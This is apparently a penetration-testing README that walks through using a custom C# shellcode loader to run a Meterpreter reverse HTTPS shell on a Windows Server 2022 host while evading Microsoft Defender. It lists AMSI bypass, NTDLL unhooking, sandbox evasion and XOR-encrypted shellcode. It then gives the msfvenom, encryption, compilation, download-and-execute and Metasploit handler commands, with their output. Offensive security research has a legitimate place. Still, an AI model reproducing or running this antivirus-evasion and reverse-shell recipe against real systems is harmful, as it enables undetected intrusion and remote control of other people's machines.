=====================================================================================================================================================
AV bypass using my C# shellCode loader 'ShellCodeLoader1'
=====================================================================================================================================================

=> URL: https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/ShellCodeLoader1

It is a shellcode loader (written in C#) that implements several common defense evasion techniques to bypass antivirus solutions such as Microsoft Defender. 

FEATURES
---------
> Classic shellcode injection technique using the function 'NtCreateThreadEx'
> Shellcode encryption (XOR)
> NTDLL unhooking (it loads a fresh new copy of ntdll.dll via file mapping and imports functions from this ntdll.dll)
> AMSI bypass
> Basic sandbox detection/evasion techniques
  - Exit if the program is running on a computer that is not joined to a domain
  - Exit if after sleeping for 15s, time did not really passed
  - Exit if a debugger is attached
  - Exit if making an uncommon API call fails (i.e. we are running in an AV sandbox that can't emulating it)
> Compatible with shellcodes of multiple C2 frameworks such as Metasploit and Havoc



=====================================================================================================================================================
PoC 1 - Example with a (x64) Meterpreter reverse HTTPS shell running on a Windows server 2022 without being detected by the Microsoft Defender AV
=====================================================================================================================================================

---------------------------------------------------------------------------------------------------------------------------------
Step 1 - Generate a stageless (x64) Meterpreter reverse HTTPS shellcode in RAW format
---------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread LHOST=192.168.13.58 LPORT=443 -a x64 -f raw -o shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 201308 bytes
Saved as: shellcode

---------------------------------------------------------------------------------------------------------------------------------
STEP 2. Use the tool 'SUPERNOVA' to convert your raw shellcode in C# format and encrypt it with the XOR algorithm
---------------------------------------------------------------------------------------------------------------------------------

> SuperNova is a shellcode encryptor & obfuscator tool
> Github: https://github.com/nickvourd/Supernova
    
jeff@kali:~/Documents/Tools/Supernova_3.6_linux$ ./Supernova -debug -input ./shellcode -lang CSharp -enc xor -output ./encrypted-shellcode.bin > supernova.txt

jeff@kali:~/Documents/Tools/Supernova_3.6_linux$ cat supernova.txt

Supernova v3.6 - Real fucking shellcode encryptor & obfuscator tool.
Supernova is an open source tool licensed under MIT.
Written with <3 by @nickvourd.
Please visit https://github.com/nickvourd/Supernova for more...

[+] Payload size: 201308 bytes

[+] Converted payload to CSHARP language

[+] The original payload:

byte[] shellcode = new byte[201308] {0x4d, 0x5a, 0x41, 0x52, 0x55, 0x48, <SNIP>

[+] Generated XOR key: byte(0x66) => 102 => f

[+] The encrypted payload with XOR:

byte[] Shellcode = new byte[201308] {0x2b, 0x3c, 0x27, 0x34, 0x33, 0x2e, <SNIP>

[+] Payload encryption with XOR completed successfully! (Completed in 37.526144ms)

[+] The encrypted shellcode saved to /home/jeff/Documents/Tools/Supernova_3.6_linux/encrypted-shellcode.bin file.


---------------------------------------------------------------------------------------------------------------------------------
STEP 3. Insert your encrypted shellcode in the C# shellcode loader file along with the XOR key randomly generated by 'SUPERNOVA'
---------------------------------------------------------------------------------------------------------------------------------

> Generated XOR key: 0x66

> Encrypted shellcode: new byte[201308] {0x2b, 0x3c, 0x27, 0x34, 0x33, 0x2e, <SNIP>};


---------------------------------------------------------------------------------------------------------------------------------
STEP 4. Manually obfuscate the C# shellcode loader file
---------------------------------------------------------------------------------------------------------------------------------

> Rename the namespace, the class, the methods, the variables, ...

> Delete the comments and add fakes ones


---------------------------------------------------------------------------------------------------------------------------------
STEP 5. Compile the C# shellcode loader
---------------------------------------------------------------------------------------------------------------------------------

Developer PowerShell for VS 2022
=================================
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Visual Studio 2022\Visual Studio Tools


**********************************************************************
** Visual Studio 2022 Developer PowerShell v17.5.1
** Copyright (c) 2022 Microsoft Corporation
**********************************************************************

PS C:\Users\auditor\source\repos> csc /t:exe /out:C:\temp\ShellCodeLoader1\CsharpShellCodeLoader.exe C:\temp\ShellCodeLoader1\CsharpShellCodeLoader.cs
Microsoft (R) Visual C# Compiler version 4.5.0-6.23123.11 (271ccd71)
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\auditor\source\repos> 

=> The shellcode loader 'CsharpShellCodeLoader.exe' has been sucessfully created in the 'C:\temp\ShellCodeLoader1\'


---------------------------------------------------------------------------------------------------------------------------------
STEP 6. Download & execute the shellcode loader on a Windows server 2022 without being detected by Microsoft Defender AV 
---------------------------------------------------------------------------------------------------------------------------------

Microsoft Windows [Version 10.0.20348.3692]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator> cd C:\temp   

C:\temp> systeminfo

Host Name:                 SERVER-WIN2022
OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
<SNIP>


C:\temp> powershell

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled, AntivirusSIgnatureLastUpdated|FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSIgnatureLastUpdated : 7/31/2025 1:06:24 AM



PS C:\temp> wget -uri http://192.168.1.144:8080/CsharpShellCodeLoader.exe -OutFile C:\temp\test.exe

PS C:\temp> .\test.exe


---------------------------------------------------------------------------------------------------------------------------------
Step 7 - Start your Metasploit listener and obtain a Meterpreter HTTPs reverse shell (stageless session) on your C2 server
---------------------------------------------------------------------------------------------------------------------------------


jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443; 
			       set EXITFUNC thread; run -j"
[sudo] password for jeff:

       =[ metasploit v6.1.14-dev                          ]
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
+ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/meterpreter_reverse_https
LHOST => 192.168.1.30
LPORT => 443
EXITFUNC => thread
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) >
[*] Started HTTPS reverse handler on https://192.168.1.30:443

[*] Meterpreter session 1 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2025-07-31 01:10:42 +0200

msf6 exploit(multi/handler) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information                              Connection
  --  ----  ----                     -----------                              ----------
  1         meterpreter x64/windows  SERVER-WIN2022\Administrator @ SERVER-W  192.168.1.30:443 -> 127.0.0.1  (192.168.
                                     IN2022                                   1.11)

msf6 exploit(multi/handler) >

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : SERVER-WIN2022
OS              : Windows 2016+ (10.0 Build 20348).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows

meterpreter > background

msf6 exploit(multi/handler) > sessions -k 1
[*] Killing the following session(s): 1
[*] Killing session 1

